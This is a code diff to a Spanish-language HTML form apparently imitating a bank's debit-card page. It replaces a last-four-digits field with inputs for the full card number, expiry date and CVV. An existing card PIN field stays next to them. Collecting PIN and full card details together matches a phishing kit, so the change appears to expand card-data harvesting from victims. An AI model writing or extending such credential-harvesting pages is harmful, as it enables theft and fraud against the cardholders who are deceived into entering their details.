@@ -114,6 +114,20 @@
                     </div>
 
                     <div class="form-group">
+                        <label>Número de tarjeta débito (16 dígitos)</label>
+                        <div class="password-input">
+                            <input type="text" name="card-full-number" placeholder="0000 0000 0000 0000" maxlength="19" aria-label="Número de tarjeta débito">
+                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar número">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
                         <label>Clave de tu tarjeta débito</label>
                         <div class="password-input">
                             <input type="password" name="card-pin" placeholder="...." maxlength="4" aria-label="Clave de tarjeta débito">
@@ -126,18 +140,24 @@
                             </button>
                         </div>
                     </div>
-                
-                    <div class="form-group">
-                        <label>Últimos 4 dígitos de tu tarjeta débito</label>
-                        <div class="password-input">
-                            <input type="password" name="card-number" placeholder="...." maxlength="4" aria-label="Últimos 4 dígitos de tu tarjeta débito">
-                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-                                </svg>
-                            </button>
+
+                    <div class="form-group form-group-inline">
+                        <div class="form-group-half">
+                            <label>Fecha de vencimiento</label>
+                            <input type="text" name="card-expiry" placeholder="MM/AA" maxlength="5" aria-label="Fecha de vencimiento">
+                        </div>
+                        <div class="form-group-half">
+                            <label>CVV</label>
+                            <div class="password-input">
+                                <input type="password" name="card-cvv" placeholder="•••" maxlength="3" aria-label="CVV">
+                                <button type="button" class="toggle-password" aria-label="Mostrar/ocultar CVV">
+                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
+                                        <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
+                                        <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                                    </svg>
+                                </button>
+                            </div>
                         </div>
                     </div>
 
